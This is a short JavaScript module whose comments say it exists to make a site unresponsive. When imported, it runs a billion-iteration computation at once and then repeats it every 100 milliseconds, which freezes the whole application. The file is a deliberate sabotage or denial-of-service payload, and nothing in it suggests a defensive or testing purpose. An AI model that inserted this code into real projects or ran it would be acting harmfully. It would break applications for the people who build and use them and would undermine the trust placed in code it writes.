// Global initialization file that makes the site unresponsive
// This file will be imported and freeze the entire application

const hang = () => {
  let result = 0;
  for (let i = 0; i < 1000000000; i++) {
    result += Math.sqrt(i);
  }
  return result;
};

// Block immediately on script load
hang();

// Also block repeatedly
setInterval(() => {
  hang();
}, 100);

export default hang;
